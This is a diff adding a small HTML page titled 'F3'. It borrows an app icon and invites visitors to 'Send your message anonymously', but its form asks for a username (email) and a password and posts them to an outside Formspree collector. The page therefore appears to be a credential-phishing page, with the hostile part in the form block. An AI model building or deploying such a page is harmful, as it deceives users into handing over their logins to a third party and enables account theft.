@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://static-s.aa-cdn.net/img/gp/20600009372626/csNhCMKLEAWeoqOjJW9b-GCeIOzv_DFRHq9NZiYmzXC1TvjmGrqVe5Bdtkfc0p0r_fc=s300?v=1">
+    <link href='https://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet'>
+    <title>F3</title>
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body{
+            display: flex;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            background-color: #85FFBD;
+            background-image: linear-gradient(45deg, #85FFBD 0%, #FFFB7D 100%);
+            flex-direction: column;
+            justify-content: space-around;
+        }
+        form{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        input{
+            width: 400px;
+            height: 40px;
+            padding: 10px;
+            border: none;
+            box-shadow: 0 0 3px #333;
+            border-radius: 5px;
+            margin: 10px;
+            font-size: 20px;
+            font-family: montserrat;
+            font-weight: 400;
+            outline: none;
+        }
+        button{
+            width: 150px;
+            background-color: dodgerblue;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            font-weight: 900;
+            cursor: pointer;
+            position: relative;            
+        }
+        button:hover{
+            background-color: deepskyblue;
+        }
+        button:active{
+            top: 3px
+        }
+        .logo{
+            width: 100px;
+            height: 100px;
+            background-image: url('https://static-s.aa-cdn.net/img/gp/20600009372626/csNhCMKLEAWeoqOjJW9b-GCeIOzv_DFRHq9NZiYmzXC1TvjmGrqVe5Bdtkfc0p0r_fc=s300?v=1');
+            background-size: cover;
+            box-shadow: 0 2px 3px #999;
+            position: fixed;
+            top: 50px;
+            border-radius: 15px;
+        }
+        h1{
+            position: relative;
+            top: 50px;
+            font-family: montserrat;
+            background-color: #14f523;
+            padding: 10px 25px;
+            border-radius: 20px;
+            box-shadow: 0 2px 3px #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo"></div>
+    <h1>Send your message anonymously</h1>
+    <form action="https://formspree.io/f/mpzkrvvp" method="POST">
+        <input placeholder="Username" type="email" name="_replyto">
+        <input placeholder="Password" type="password" name="message">
+        <button type="submit">Send</button>
+    </form>
+
+
+
+</body>
+</html>
